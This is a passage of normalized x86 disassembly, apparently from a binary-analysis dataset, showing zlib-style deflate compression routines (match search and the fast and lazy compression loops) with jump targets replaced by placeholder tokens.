mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x58 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
sub eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x6c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x58 ]
cmp ecx [ eax + 0x78 ]
ja r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407f32
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_405b20
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407f32
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_405b20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
jmp r-xdata
jmp r-xdata
sub_406a9a
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jbe r-xdata
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax ecx
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x6c ]
jbe r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x2
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
lea ecx [ ecx + eax + 0x102 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x84 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx - 0x1 ]
mov eax [ ebp - 0x8 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0xc ]
and eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x20 ]
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
cmp edx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx + 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1 ]
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x14 ]
mov ecx 0x102
sub ecx eax
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x102
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x68 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0xc ]
jl r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x30 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
sub_406dc9
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406270
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
mov [ edx + 0x70 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x68 ]
mov [ edx + 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x70 ] 0x3
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x78 ]
jae r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x58 ]
cmp eax [ edx + 0x70 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx + 0x60 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x18 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x18 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
lea edx [ edx + ecx - 0x3 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x3
mov [ ebp - 0x14 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
sub eax [ ecx + 0x5c ]
mov [ ebp - 0x10 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0x10 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x14 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
mov eax [ ebp - 0x14 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0x10 ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x1c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x1c ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x5
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_406a9a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x2c ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x70 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x70 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407f32
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_405b20
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407f32
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_405b20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x3
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
cmp ecx 0x1000
jbe r-xdata
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407f32
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_405b20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_4074de
push ebp
mov ebp esp
